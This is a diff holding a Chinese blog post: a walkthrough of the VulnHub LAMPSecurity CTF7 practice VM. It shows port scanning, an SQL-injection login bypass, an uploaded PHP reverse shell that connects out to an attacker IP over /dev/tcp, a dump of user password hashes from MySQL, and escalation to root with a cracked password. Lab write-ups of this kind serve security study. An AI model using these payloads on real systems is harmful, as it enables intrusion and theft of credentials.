@@ -1,166 +1,340 @@
-<!doctype html><html itemscope itemtype=http://schema.org/WebPage lang=zh-CN><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1,maximum-scale=2"><meta name=robots content="noodp"><title>VulnHub_03_LAMPSECURITY: CTF7 - Ghostasky's Blog</title><meta name=author content>
-<meta name=author-link content><meta name=description content><meta name=keywords content='VulnHub'><meta itemprop=name content="VulnHub_03_LAMPSECURITY: CTF7"><meta itemprop=description content><meta itemprop=datePublished content="2022-02-19T00:00:00+00:00"><meta itemprop=dateModified content="2022-02-19T00:00:00+00:00"><meta itemprop=wordCount content="1210"><meta itemprop=keywords content="VulnHub,"><meta property="og:title" content="VulnHub_03_LAMPSECURITY: CTF7"><meta property="og:description" content><meta property="og:type" content="article"><meta property="og:url" content="http://ghostasky.github.io/posts/vulnhub03/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2022-02-19T00:00:00+00:00"><meta property="article:modified_time" content="2022-02-19T00:00:00+00:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="VulnHub_03_LAMPSECURITY: CTF7"><meta name=twitter:description content><meta name=application-name content="FixIt"><meta name=apple-mobile-web-app-title content="FixIt"><meta name=theme-color data-light=#f8f8f8 data-dark=#252627 content="#f8f8f8"><meta name=msapplication-TileColor content="#da532c"><link rel="shortcut icon" type=image/x-icon href=/favicon.ico><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=mask-icon href=/safari-pinned-tab.svg color=#5bbad5><link rel=canonical href=http://ghostasky.github.io/posts/vulnhub03/><link rel=prev href=http://ghostasky.github.io/posts/vulnhub02/><link rel=next href=http://ghostasky.github.io/posts/nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/><link rel=stylesheet href=/css/style.min.css><link rel=preload href=/lib/fontawesome-free/all.min.css as=style onload='this.removeAttribute("onload"),this.rel="stylesheet"'><noscript><link rel=stylesheet href=/lib/fontawesome-free/all.min.css></noscript><link rel=preload href=/lib/animate/animate.min.css as=style onload='this.removeAttribute("onload"),this.rel="stylesheet"'><noscript><link rel=stylesheet href=/lib/animate/animate.min.css></noscript><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"VulnHub_03_LAMPSECURITY: CTF7","inLanguage":"zh-CN","mainEntityOfPage":{"@type":"WebPage","@id":"http:\/\/ghostasky.github.io\/posts\/vulnhub03\/"},"genre":"posts","keywords":"VulnHub","wordcount":1210,"url":"http:\/\/ghostasky.github.io\/posts\/vulnhub03\/","datePublished":"2022-02-19T00:00:00+00:00","dateModified":"2022-02-19T00:00:00+00:00","publisher":{"@type":"Organization","name":""},"author":{"@type":"Person","name":"作者"},"description":""}</script></head><body data-header-desktop=sticky data-header-mobile=auto><script>(window.localStorage?.getItem("theme")?localStorage.getItem("theme")==="dark":"auto"==="auto"?window.matchMedia("(prefers-color-scheme: dark)").matches:"auto"==="dark")&&document.body.setAttribute("data-theme","dark")</script><div class=wrapper data-page-style=normal><header class="desktop animate__faster" id=header-desktop><div class=header-wrapper><div class=header-title><a href=/ title="Ghostasky's Blog"><img loading=lazy src=/images/fixit.png alt="Ghostasky's Blog" data-title="Ghostasky's Blog" class=logo style="background:url(/images/loading.min.svg)no-repeat 50%" onload='this.title=this.dataset.title;for(const e of["style","data-title","onerror","onload"])this.removeAttribute(e);this.dataset.lazyloaded=""' onerror='this.title=this.dataset.title;for(const e of["style","data-title","onerror","onload"])this.removeAttribute(e)'><span class=header-title-text>Ghostasky's Blog</span></a><span class=header-subtitle></span></div><nav><ul class=menu><li class=menu-item><a class=menu-link href=/posts/>文章</a></li><li class=menu-item><a class=menu-link href=/categories/>分类</a></li><li class=menu-item><a class=menu-link href=/tags/>标签</a></li><li class=menu-item><a class=menu-link href=/about/>关于</a></li><li class="menu-item delimiter"></li><li class="menu-item theme-switch" title=切换主题><i class="fa-solid fa-adjust fa-fw" aria-hidden=true></i></li></ul></nav></div></header><header class="mobile animate__faster" id=header-mobile><div class=header-container><div class=header-wrapper><div class=header-title><a href=/ title="Ghostasky's Blog"><img loading=lazy src=/images/fixit.png alt=/images/fixit.png data-title=/images/fixit.png class=logo style="background:url(/images/loading.min.svg)no-repeat 50%" onload='this.title=this.dataset.title;for(const e of["style","data-title","onerror","onload"])this.removeAttribute(e);this.dataset.lazyloaded=""' onerror='this.title=this.dataset.title;for(const e of["style","data-title","onerror","onload"])this.removeAttribute(e)'><span class=header-title-text>Ghostasky's Blog</span></a><span class=header-subtitle></span></div><div class=menu-toggle id=menu-toggle-mobile><span></span><span></span><span></span></div></div><nav><ul class=menu id=menu-mobile><li class=menu-item><a class=menu-link href=/posts/>文章</a></li><li class=menu-item><a class=menu-link href=/categories/>分类</a></li><li class=menu-item><a class=menu-link href=/tags/>标签</a></li><li class=menu-item><a class=menu-link href=/about/>关于</a></li><li class="menu-item menu-system"><span class="menu-system-item theme-switch" title=切换主题><i class="fa-solid fa-adjust fa-fw" aria-hidden=true></i></span></li></ul></nav></div></header><main class=container><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label=合集></aside><article class="page single"><div class=header><h1 class="single-title animate__animated animate__flipInX"><span>VulnHub_03_LAMPSECURITY: CTF7</span></h1></div><div class=post-meta><div class=post-meta-line><span class=post-author><span class=author><i class="fa-solid fa-user-circle" aria-hidden=true></i>
-Anonymous</span></span><span class=post-included-in>&nbsp;收录于 <a href=/categories/technology/ class=post-category title="分类 - Technology"><i class="fa-regular fa-folder fa-fw" aria-hidden=true></i> Technology</a></span></div><div class=post-meta-line><span title="发布于 2022-02-19 00:00:00"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden=true></i><time datetime=2022-02-19>2022-02-19</time></span>&nbsp;<span title="1210 字"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden=true></i>约 1300 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden=true></i>预计阅读 3 分钟</span>&nbsp;</div></div><div class=content id=content><p>download：<code>https://www.vulnhub.com/entry/lampsecurity-ctf7,86/</code></p><p>找到ip为：<code>192.168.188.132</code></p><blockquote><p>nmap参数：</p><p>-Pn ：不检测主机存活</p></blockquote><div class=highlight id=id-1><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>┌──<span class=o>(</span>root💀kali<span class=o>)</span>-<span class=o>[</span>/home/kali<span class=o>]</span>
-</span></span><span class=line><span class=cl>└─# nmap -Pn -sV 192.168.188.132                                                                               <span class=m>130</span> ⨯
-</span></span><span class=line><span class=cl>Host discovery disabled <span class=o>(</span>-Pn<span class=o>)</span>. All addresses will be marked <span class=s1>&#39;up&#39;</span> and scan <span class=nb>times</span> will be slower.
-</span></span><span class=line><span class=cl>Starting Nmap 7.91 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2022-02-19 03:56 EST
-</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 192.168.188.132
-</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.00064s latency<span class=o>)</span>.
-</span></span><span class=line><span class=cl>Not shown: <span class=m>993</span> filtered ports
-</span></span><span class=line><span class=cl>PORT      STATE  SERVICE     VERSION
-</span></span><span class=line><span class=cl>22/tcp    open   ssh         OpenSSH 5.3 <span class=o>(</span>protocol 2.0<span class=o>)</span>
-</span></span><span class=line><span class=cl>80/tcp    open   http        Apache httpd 2.2.15 <span class=o>((</span>CentOS<span class=o>))</span>
-</span></span><span class=line><span class=cl>139/tcp   open   netbios-ssn Samba smbd 3.X - 4.X <span class=o>(</span>workgroup: MYGROUP<span class=o>)</span>
-</span></span><span class=line><span class=cl>901/tcp   open   http        Samba SWAT administration server
-</span></span><span class=line><span class=cl>5900/tcp  closed vnc
-</span></span><span class=line><span class=cl>8080/tcp  open   http        Apache httpd 2.2.15 <span class=o>((</span>CentOS<span class=o>))</span>
-</span></span><span class=line><span class=cl>10000/tcp open   http        MiniServ 1.610 <span class=o>(</span>Webmin httpd<span class=o>)</span>
-</span></span><span class=line><span class=cl>MAC Address: 00:0C:29:9D:12:A9 <span class=o>(</span>VMware<span class=o>)</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 46.98 seconds</span></span></code></pre></div><p>8080有个web服务，登录框：<code>' or 1=1 -- .</code>，直接注入进去</p><p>在reading上传shell</p><div class=highlight id=id-2><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>&lt;?</span><span class=nx>php</span>
-</span></span><span class=line><span class=cl><span class=nx>system</span><span class=p>(</span><span class=s2>&#34;bash -i &gt;&amp; /dev/tcp/192.168.188.129/4444 0&gt;&amp;1&#34;</span><span class=p>);</span>
-</span></span><span class=line><span class=cl><span class=cp>?&gt;</span><span class=err>  
-</span></span></span></code></pre></div><p><img loading=lazy src=image-20220219171650551.png alt=image-20220219171650551 srcset="image-20220219171650551.png?size=small, image-20220219171650551.png?size=medium 1.5x, image-20220219171650551.png?size=large 2x" data-title=image-20220219171650551 style="background:url(/images/loading.min.svg)no-repeat 50%" onload='this.title=this.dataset.title;for(const e of["style","data-title","onerror","onload"])this.removeAttribute(e);this.dataset.lazyloaded=""' onerror='this.title=this.dataset.title;for(const e of["style","data-title","onerror","onload"])this.removeAttribute(e)'></p><p>但是不知道上传的位置，扫一下：</p><div class=highlight id=id-3><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>┌──<span class=o>(</span>root💀kali<span class=o>)</span>-<span class=o>[</span>/home/kali<span class=o>]</span>
-</span></span><span class=line><span class=cl>└─# dirb http://192.168.188.132                                                                                <span class=m>255</span> ⨯
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>-----------------
-</span></span><span class=line><span class=cl>DIRB v2.22    
-</span></span><span class=line><span class=cl>By The Dark Raver
-</span></span><span class=line><span class=cl>-----------------
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>START_TIME: Sat Feb <span class=m>19</span> 04:17:38 <span class=m>2022</span>
-</span></span><span class=line><span class=cl>URL_BASE: http://192.168.188.132/
-</span></span><span class=line><span class=cl>WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>-----------------
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>GENERATED WORDS: <span class=m>4612</span>                                                          
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>---- Scanning URL: http://192.168.188.132/ ----
-</span></span><span class=line><span class=cl>+ http://192.168.188.132/about <span class=o>(</span>CODE:200<span class=p>|</span>SIZE:4910<span class=o>)</span>                                                                 
-</span></span><span class=line><span class=cl><span class=o>==</span>&gt; DIRECTORY: http://192.168.188.132/assets/                                                                       
-</span></span><span class=line><span class=cl>+ http://192.168.188.132/backups <span class=o>(</span>CODE:301<span class=p>|</span>SIZE:335<span class=o>)</span>                                                                
-</span></span><span class=line><span class=cl>+ http://192.168.188.132/cgi-bin/ <span class=o>(</span>CODE:403<span class=p>|</span>SIZE:291<span class=o>)</span>                                                               
-</span></span><span class=line><span class=cl>+ http://192.168.188.132/contact <span class=o>(</span>CODE:200<span class=p>|</span>SIZE:5017<span class=o>)</span>                                                               
-</span></span><span class=line><span class=cl><span class=o>==</span>&gt; DIRECTORY: http://192.168.188.132/css/                                                                          
-</span></span><span class=line><span class=cl>+ http://192.168.188.132/db <span class=o>(</span>CODE:200<span class=p>|</span>SIZE:3904<span class=o>)</span>                                                                    
-</span></span><span class=line><span class=cl>+ http://192.168.188.132/default <span class=o>(</span>CODE:200<span class=p>|</span>SIZE:6058<span class=o>)</span>                                                               
-</span></span><span class=line><span class=cl>+ http://192.168.188.132/footer <span class=o>(</span>CODE:200<span class=p>|</span>SIZE:3904<span class=o>)</span>                                                                
-</span></span><span class=line><span class=cl>+ http://192.168.188.132/header <span class=o>(</span>CODE:200<span class=p>|</span>SIZE:3904<span class=o>)</span>                                                                
-</span></span><span class=line><span class=cl><span class=o>==</span>&gt; DIRECTORY: http://192.168.188.132/img/                                                                          
-</span></span><span class=line><span class=cl><span class=o>==</span>&gt; DIRECTORY: http://192.168.188.132/inc/                                                                          
-</span></span><span class=line><span class=cl>+ http://192.168.188.132/index.php <span class=o>(</span>CODE:200<span class=p>|</span>SIZE:6058<span class=o>)</span>                                                             
-</span></span><span class=line><span class=cl><span class=o>==</span>&gt; DIRECTORY: http://192.168.188.132/js/                                                                           
-</span></span><span class=line><span class=cl>+ http://192.168.188.132/newsletter <span class=o>(</span>CODE:200<span class=p>|</span>SIZE:4037<span class=o>)</span>                                                            
-</span></span><span class=line><span class=cl>+ http://192.168.188.132/phpinfo <span class=o>(</span>CODE:200<span class=p>|</span>SIZE:58773<span class=o>)</span>                                                              
-</span></span><span class=line><span class=cl>+ http://192.168.188.132/profile <span class=o>(</span>CODE:200<span class=p>|</span>SIZE:3977<span class=o>)</span>              </span></span></code></pre></div><p>注意到：http://192.168.188.132/assets/</p><div class=highlight id=id-4><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>┌──<span class=o>(</span>kali㉿kali<span class=o>)</span>-<span class=o>[</span>~<span class=o>]</span>
-</span></span><span class=line><span class=cl>└─$ nc -lp <span class=m>4444</span>
-</span></span><span class=line><span class=cl>bash: no job control in this shell
-</span></span><span class=line><span class=cl>bash-4.1$ ls
-</span></span><span class=line><span class=cl>ls
-</span></span><span class=line><span class=cl>0223_cybersecurity_china_us_lieberthal_singer_pdf_english.pdf
-</span></span><span class=line><span class=cl>1.php
-</span></span><span class=line><span class=cl>88x31.png
-</span></span><span class=line><span class=cl>apple-touch-icon-114-precomposed.png
-</span></span><span class=line><span class=cl>apple-touch-icon-144-precomposed.png
-</span></span><span class=line><span class=cl>apple-touch-icon-57-precomposed.png
-</span></span><span class=line><span class=cl>apple-touch-icon-72-precomposed.png
-</span></span><span class=line><span class=cl>higher-eduction-national-security.pdf
-</span></span><span class=line><span class=cl>re.php
-</span></span><span class=line><span class=cl>reverse_php_shell.php
-</span></span><span class=line><span class=cl>bash-4.1$ python -c <span class=s1>&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
-</span></span><span class=line><span class=cl>python -c <span class=s1>&#39;import pty; pty.spawn(&#34;/bin/bash&#34;)&#39;</span>
-</span></span><span class=line><span class=cl>bash-4.1$ mysql -u root
-</span></span><span class=line><span class=cl>mysql -u root
-</span></span><span class=line><span class=cl>Welcome to the MySQL monitor.  Commands end with <span class=p>;</span> or <span class=se>\g</span>.
-</span></span><span class=line><span class=cl>Your MySQL connection id is <span class=m>242</span>
-</span></span><span class=line><span class=cl>Server version: 5.1.66 Source distribution
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>Copyright <span class=o>(</span>c<span class=o>)</span> 2000, 2012, Oracle and/or its affiliates. All rights reserved.
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>Oracle is a registered trademark of Oracle Corporation and/or its
-</span></span><span class=line><span class=cl>affiliates. Other names may be trademarks of their respective
-</span></span><span class=line><span class=cl>owners.
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>Type <span class=s1>&#39;help;&#39;</span> or <span class=s1>&#39;\h&#39;</span> <span class=k>for</span> help. Type <span class=s1>&#39;\c&#39;</span> to clear the current input statement.
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>mysql&gt; show databases<span class=p>;</span>
-</span></span><span class=line><span class=cl>show databases<span class=p>;</span>
-</span></span><span class=line><span class=cl>+--------------------+
-</span></span><span class=line><span class=cl><span class=p>|</span> Database           <span class=p>|</span>
-</span></span><span class=line><span class=cl>+--------------------+
-</span></span><span class=line><span class=cl><span class=p>|</span> information_schema <span class=p>|</span>
-</span></span><span class=line><span class=cl><span class=p>|</span> mysql              <span class=p>|</span>
-</span></span><span class=line><span class=cl><span class=p>|</span> roundcube          <span class=p>|</span>
-</span></span><span class=line><span class=cl><span class=p>|</span> website            <span class=p>|</span>
-</span></span><span class=line><span class=cl>+--------------------+
-</span></span><span class=line><span class=cl><span class=m>4</span> rows in <span class=nb>set</span> <span class=o>(</span>0.00 sec<span class=o>)</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>mysql&gt; use website<span class=p>;</span>
-</span></span><span class=line><span class=cl>use website<span class=p>;</span>
-</span></span><span class=line><span class=cl>Reading table information <span class=k>for</span> completion of table and column names
-</span></span><span class=line><span class=cl>You can turn off this feature to get a quicker startup with -A
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>Database changed
-</span></span><span class=line><span class=cl>mysql&gt; show tables<span class=p>;</span>
-</span></span><span class=line><span class=cl>show tables<span class=p>;</span>
-</span></span><span class=line><span class=cl>+-------------------+
-</span></span><span class=line><span class=cl><span class=p>|</span> Tables_in_website <span class=p>|</span>
-</span></span><span class=line><span class=cl>+-------------------+
-</span></span><span class=line><span class=cl><span class=p>|</span> contact           <span class=p>|</span>
-</span></span><span class=line><span class=cl><span class=p>|</span> documents         <span class=p>|</span>
-</span></span><span class=line><span class=cl><span class=p>|</span> hits              <span class=p>|</span>
-</span></span><span class=line><span class=cl><span class=p>|</span> log               <span class=p>|</span>
-</span></span><span class=line><span class=cl><span class=p>|</span> newsletter        <span class=p>|</span>
-</span></span><span class=line><span class=cl><span class=p>|</span> payment           <span class=p>|</span>
-</span></span><span class=line><span class=cl><span class=p>|</span> trainings         <span class=p>|</span>
-</span></span><span class=line><span class=cl><span class=p>|</span> trainings_x_users <span class=p>|</span>
-</span></span><span class=line><span class=cl><span class=p>|</span> users             <span class=p>|</span>
-</span></span><span class=line><span class=cl>+-------------------+
-</span></span><span class=line><span class=cl><span class=m>9</span> rows in <span class=nb>set</span> <span class=o>(</span>0.00 sec<span class=o>)</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>mysql&gt; <span class=k>select</span> * from users
-</span></span><span class=line><span class=cl><span class=k>select</span> * from users
-</span></span><span class=line><span class=cl>    -&gt; <span class=p>;</span>
-</span></span><span class=line><span class=cl><span class=p>;</span>
-</span></span><span class=line><span class=cl>+-------------------------------+----------------------------------+----------+---------------------+---------+-----------------+--------------------------------------------------------------------------+
-</span></span><span class=line><span class=cl><span class=p>|</span> username                      <span class=p>|</span> password                         <span class=p>|</span> is_admin <span class=p>|</span> last_login          <span class=p>|</span> user_id <span class=p>|</span> realname        <span class=p>|</span> profile                                                                  <span class=p>|</span>
-</span></span><span class=line><span class=cl>+-------------------------------+----------------------------------+----------+---------------------+---------+-----------------+--------------------------------------------------------------------------+
-</span></span><span class=line><span class=cl><span class=p>|</span> brian@localhost.localdomain   <span class=p>|</span> e22f07b17f98e0d9d364584ced0e3c18 <span class=p>|</span>        <span class=m>1</span> <span class=p>|</span> 2012-12-19 11:30:54 <span class=p>|</span>       <span class=m>3</span> <span class=p>|</span> Brian Hershel   <span class=p>|</span> Brian is our technical brains behind the operations and a chief trainer. <span class=p>|</span>
-</span></span><span class=line><span class=cl><span class=p>|</span> john@localhost.localdomain    <span class=p>|</span> 0d9ff2a4396d6939f80ffe09b1280ee1 <span class=p>|</span>        <span class=m>1</span> <span class=p>|</span> NULL                <span class=p>|</span>       <span class=m>4</span> <span class=p>|</span> John Durham     <span class=p>|</span>                                                                          <span class=p>|</span>
-</span></span><span class=line><span class=cl><span class=p>|</span> alice@localhost.localdomain   <span class=p>|</span> 2146bf95e8929874fc63d54f50f1d2e3 <span class=p>|</span>        <span class=m>1</span> <span class=p>|</span> NULL                <span class=p>|</span>       <span class=m>5</span> <span class=p>|</span> Alice Wonder    <span class=p>|</span>                                                                          <span class=p>|</span>
-</span></span><span class=line><span class=cl><span class=p>|</span> ruby@localhost.localdomain    <span class=p>|</span> 9f80ec37f8313728ef3e2f218c79aa23 <span class=p>|</span>        <span class=m>1</span> <span class=p>|</span> NULL                <span class=p>|</span>       <span class=m>6</span> <span class=p>|</span> Ruby Spinster   <span class=p>|</span>                                                                          <span class=p>|</span>
-</span></span><span class=line><span class=cl><span class=p>|</span> leon@localhost.localdomain    <span class=p>|</span> 5d93ceb70e2bf5daa84ec3d0cd2c731a <span class=p>|</span>        <span class=m>1</span> <span class=p>|</span> NULL                <span class=p>|</span>       <span class=m>7</span> <span class=p>|</span> Leon Parnetta   <span class=p>|</span>                                                                          <span class=p>|</span>
-</span></span><span class=line><span class=cl><span class=p>|</span> julia@localhost.localdomain   <span class=p>|</span> ed2539fe892d2c52c42a440354e8e3d5 <span class=p>|</span>        <span class=m>1</span> <span class=p>|</span> NULL                <span class=p>|</span>       <span class=m>8</span> <span class=p>|</span> Julia Fields    <span class=p>|</span>                                                                          <span class=p>|</span>
-</span></span><span class=line><span class=cl><span class=p>|</span> michael@localhost.localdomain <span class=p>|</span> 9c42a1346e333a770904b2a2b37fa7d3 <span class=p>|</span>        <span class=m>0</span> <span class=p>|</span> NULL                <span class=p>|</span>       <span class=m>9</span> <span class=p>|</span> Michael Saint   <span class=p>|</span>                                                                          <span class=p>|</span>
-</span></span><span class=line><span class=cl><span class=p>|</span> bruce@localhost.localdomain   <span class=p>|</span> 3a24d81c2b9d0d9aaf2f10c6c9757d4e <span class=p>|</span>        <span class=m>0</span> <span class=p>|</span> NULL                <span class=p>|</span>      <span class=m>10</span> <span class=p>|</span> Bruce Pottricks <span class=p>|</span>                                                                          <span class=p>|</span>
-</span></span><span class=line><span class=cl><span class=p>|</span> neil@localhost.localdomain    <span class=p>|</span> 4773408d5358875b3764db552a29ca61 <span class=p>|</span>        <span class=m>0</span> <span class=p>|</span> NULL                <span class=p>|</span>      <span class=m>11</span> <span class=p>|</span> Neil Felstein   <span class=p>|</span>                                                                          <span class=p>|</span>
-</span></span><span class=line><span class=cl><span class=p>|</span> charles@localhost.localdomain <span class=p>|</span> b2a97bcecbd9336b98d59d9324dae5cf <span class=p>|</span>        <span class=m>0</span> <span class=p>|</span> NULL                <span class=p>|</span>      <span class=m>12</span> <span class=p>|</span> Charles Adams   <span class=p>|</span>                                                                          <span class=p>|</span>
-</span></span><span class=line><span class=cl><span class=p>|</span> foo@bar.com                   <span class=p>|</span> 4cb9c8a8048fd02294477fcb1a41191a <span class=p>|</span>        <span class=m>0</span> <span class=p>|</span> NULL                <span class=p>|</span>      <span class=m>36</span> <span class=p>|</span>                 <span class=p>|</span>                                                                          <span class=p>|</span>
-</span></span><span class=line><span class=cl><span class=p>|</span> test@nowhere.com              <span class=p>|</span> 098f6bcd4621d373cade4e832627b4f6 <span class=p>|</span>        <span class=m>0</span> <span class=p>|</span> NULL                <span class=p>|</span>     <span class=m>113</span> <span class=p>|</span>                 <span class=p>|</span>                                                                          <span class=p>|</span>
-</span></span><span class=line><span class=cl>+-------------------------------+----------------------------------+----------+---------------------+---------+-----------------+--------------------------------------------------------------------------+</span></span></code></pre></div><p>用一些脚本破解hash，或者在线的网站</p><div class=highlight id=id-5><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>bash-4.1$ su brian
-</span></span><span class=line><span class=cl>su brian
-</span></span><span class=line><span class=cl>Password: my2cents
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=o>[</span>brian@localhost assets<span class=o>]</span>$ id
-</span></span><span class=line><span class=cl>id
-</span></span><span class=line><span class=cl><span class=nv>uid</span><span class=o>=</span>501<span class=o>(</span>brian<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>501<span class=o>(</span>brian<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>501<span class=o>(</span>brian<span class=o>)</span>,10<span class=o>(</span>wheel<span class=o>)</span>,500<span class=o>(</span>webdev<span class=o>)</span>,512<span class=o>(</span>admin<span class=o>)</span> <span class=nv>context</span><span class=o>=</span>system_u:system_r:httpd_t:s0
-</span></span><span class=line><span class=cl><span class=o>[</span>brian@localhost assets<span class=o>]</span>$ sudo su
-</span></span><span class=line><span class=cl>sudo su
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>We trust you have received the usual lecture from the <span class=nb>local</span> System
-</span></span><span class=line><span class=cl>Administrator. It usually boils down to these three things:
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl>    <span class=c1>#1) Respect the privacy of others.</span>
-</span></span><span class=line><span class=cl>    <span class=c1>#2) Think before you type.</span>
-</span></span><span class=line><span class=cl>    <span class=c1>#3) With great power comes great responsibility.</span>
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=o>[</span>sudo<span class=o>]</span> password <span class=k>for</span> brian: my2cents
-</span></span><span class=line><span class=cl>
-</span></span><span class=line><span class=cl><span class=o>[</span>root@localhost assets<span class=o>]</span><span class=c1># </span></span></span></code></pre></div></div><div class=post-footer id=post-footer><div class=post-info><div class=post-info-line><div class=post-info-mod><span title="更新于 2022-02-19 00:00:00">更新于 2022-02-19&nbsp;</span></div><div class=post-info-license><span><a rel="license external nofollow noopener noreferrer" href=https://creativecommons.org/licenses/by-nc-sa/4.0/ target=_blank>CC BY-NC-SA 4.0</a></span></div></div><div class=post-info-line><div class=post-info-md></div><div class=post-info-share><span><a href=javascript:void(0); title="分享到 Twitter" data-sharer=twitter data-url=http://ghostasky.github.io/posts/vulnhub03/ data-title="VulnHub_03_LAMPSECURITY: CTF7" data-hashtags=VulnHub><i class="fa-brands fa-twitter fa-fw" aria-hidden=true></i></a>
-<a href=javascript:void(0); title="分享到 Facebook" data-sharer=facebook data-url=http://ghostasky.github.io/posts/vulnhub03/ data-hashtag=VulnHub><i class="fa-brands fa-facebook-square fa-fw" aria-hidden=true></i></a>
-<a href=javascript:void(0); title="分享到 微博" data-sharer=weibo data-url=http://ghostasky.github.io/posts/vulnhub03/ data-title="VulnHub_03_LAMPSECURITY: CTF7"><i class="fa-brands fa-weibo fa-fw" aria-hidden=true></i></a></span></div></div></div><div class=post-info-more><section class=post-tags><i class="fa-solid fa-tags fa-fw me-1" aria-hidden=true></i><a href=/tags/vulnhub/ class=post-tag title="标签 - VulnHub">VulnHub</a></section><section><span><a href=javascript:void(0); onclick=window.history.back()>返回</a></span>&nbsp;|&nbsp;<span><a href=/>主页</a></span></section></div><div class=post-nav><a href=/posts/vulnhub02/ class=post-nav-item rel=prev title="VulnHub_02_LAMPSECURITY: CTF5"><i class="fa-solid fa-angle-left fa-fw" aria-hidden=true></i>VulnHub_02_LAMPSECURITY: CTF5</a>
-<a href=/posts/nodejs%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/ class=post-nav-item rel=next title=Nodejs原型链污染>Nodejs原型链污染<i class="fa-solid fa-angle-right fa-fw" aria-hidden=true></i></a></div></div></article><aside class=toc id=toc-auto aria-label=目录></aside></main><footer class=footer><div class=footer-container><div class="footer-line powered">由 <a href=https://gohugo.io/ target=_blank rel="external nofollow noopener noreferrer" title="Hugo 0.123.8"><img class=hugo-icon src=/images/hugo.min.svg alt="Hugo logo"> Hugo</a> 强力驱动 | 主题 - <a href=https://github.com/hugo-fixit/FixIt target=_blank rel=external title="FixIt v0.3.2"><img class=fixit-icon src=/images/fixit.min.svg alt="FixIt logo"> FixIt</a></div><div class="footer-line copyright" itemscope itemtype=http://schema.org/CreativeWork><i class="fa-regular fa-copyright fa-fw" aria-hidden=true></i>
-<span itemprop=copyrightYear>2024</span><span class=author itemprop=copyrightHolder>
-<a href=/></a></span></div></div></footer></div><div class=widgets><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role=button aria-label=回到顶部><i class="fa-solid fa-arrow-up fa-fw" aria-hidden=true></i><span class="variant-numeric d-none">0%</span></div></div><div id=mask></div><noscript><div class=noscript-warning>FixIt 主题在启用 JavaScript 的情况下效果最佳。</div></noscript></div><link rel=preload href=/lib/katex/katex.min.css as=style onload='this.removeAttribute("onload"),this.rel="stylesheet"'><noscript><link rel=stylesheet href=/lib/katex/katex.min.css></noscript><link rel=stylesheet href=/lib/cookieconsent/cookieconsent.min.css><script src=/lib/sharer/sharer.min.js async defer></script><script src=/lib/katex/katex.min.js defer></script><script src=/lib/katex/auto-render.min.js defer></script><script src=/lib/katex/copy-tex.min.js defer></script><script src=/lib/katex/mhchem.min.js defer></script><script src=/lib/cookieconsent/cookieconsent.min.js defer></script><script>window.config={code:{copyTitle:"复制到剪贴板",editLockTitle:"锁定可编辑代码块",editUnLockTitle:"解锁可编辑代码块",editable:!0,maxShownLines:10},comment:{enable:!1},cookieconsent:{content:{dismiss:"同意",link:"了解更多",message:"本网站使用 Cookies 来改善您的浏览体验。"},enable:!0,palette:{button:{background:"#f0f0f0"},popup:{background:"#1aa3ff"}},theme:"edgeless"},math:{delimiters:[{display:!0,left:"$$",right:"$$"},{display:!0,left:"\\[",right:"\\]"},{display:!0,left:"\\begin{equation}",right:"\\end{equation}"},{display:!0,left:"\\begin{equation*}",right:"\\end{equation*}"},{display:!0,left:"\\begin{align}",right:"\\end{align}"},{display:!0,left:"\\begin{align*}",right:"\\end{align*}"},{display:!0,left:"\\begin{alignat}",right:"\\end{alignat}"},{display:!0,left:"\\begin{alignat*}",right:"\\end{alignat*}"},{display:!0,left:"\\begin{gather}",right:"\\end{gather}"},{display:!0,left:"\\begin{CD}",right:"\\end{CD}"},{display:!1,left:"$",right:"$"},{display:!1,left:"\\(",right:"\\)"}],strict:!1}}</script><script src=/js/theme.min.js defer></script></body></html>
